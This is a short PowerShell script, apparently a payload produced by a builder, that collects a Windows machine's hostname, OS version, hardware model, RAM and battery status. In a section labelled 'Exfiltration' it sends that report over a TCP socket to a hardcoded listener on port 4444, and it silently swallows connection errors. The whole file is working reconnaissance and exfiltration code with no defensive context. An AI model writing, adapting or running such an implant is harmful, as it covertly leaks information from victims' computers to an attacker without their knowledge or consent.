# This script gathers system information and sends it to a listener.

# --- Configuration ---
$ListenerIP = "10.46.70.32" # This will be replaced by the builder
$ListenerPort = "4444"       # <-- IMPORTANT: Change this to your listener's port

# --- Information Gathering ---
$computerInfo = Get-ComputerInfo
$osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
$batteryInfo = Get-CimInstance -ClassName Win32_Battery

$report = @"
--- SYSTEM REPORT ---
Hostname: $($computerInfo.CsName)
OS: $($osInfo.Caption) $($osInfo.Version)
Manufacturer: $($computerInfo.CsManufacturer)
Model: $($computerInfo.CsModel)
Total RAM (GB): [math]::Round($($computerInfo.TotalPhysicalMemory / 1GB), 2)
Battery Status: $($batteryInfo.BatteryStatus)
Battery Charge (%): $($batteryInfo.EstimatedChargeRemaining)
-------------------------
"@

# --- Exfiltration ---
try {
    $client = New-Object System.Net.Sockets.TCPClient($ListenerIP, $ListenerPort)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.WriteLine($report)
    $writer.Flush()
    $client.Close()
} catch {
    # Failed to connect to listener
}
